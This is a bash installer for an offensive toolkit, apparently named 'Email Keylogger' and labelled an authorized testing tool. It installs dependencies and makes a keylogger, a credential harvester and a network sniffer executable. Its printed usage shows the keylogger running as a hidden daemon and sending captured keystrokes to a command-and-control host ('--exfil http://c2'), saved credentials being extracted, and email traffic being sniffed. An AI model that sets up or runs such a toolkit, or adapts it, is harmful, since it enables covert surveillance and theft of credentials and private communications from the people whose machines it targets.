#!/bin/bash
# Setup script for Email Keylogger tool

echo "[*] Installing Email Keylogger - Authorized Testing Tool"
echo ""

# Check Python
if ! command -v python3 &> /dev/null; then
    echo "[-] Python3 not found. Installing..."
    if [ -f /etc/debian_version ]; then
        sudo apt update && sudo apt install -y python3 python3-pip
    elif [ -f /etc/redhat-release ]; then
        sudo yum install -y python3 python3-pip
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        brew install python3
    fi
fi

# Install Python dependencies
echo "[*] Installing Python dependencies..."
pip3 install pynput requests scapy colorama 2>/dev/null || pip install pynput requests scapy colorama

# Linux-specific dependencies
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    echo "[*] Installing Linux dependencies..."
    sudo apt install -y xdotool x11-utils 2>/dev/null || true
fi

# Make scripts executable
chmod +x keylogger.py email_harvester.py network_sniffer.py

echo ""
echo "[+] Installation complete!"
echo ""
echo "Usage:"
echo "  python3 keylogger.py                    # Run keylogger"
echo "  python3 keylogger.py --daemon           # Run in background"
echo "  python3 keylogger.py --exfil http://c2  # With exfiltration"
echo "  python3 email_harvester.py              # Extract saved creds"
echo "  sudo python3 network_sniffer.py -i eth0 # Sniff email protocols"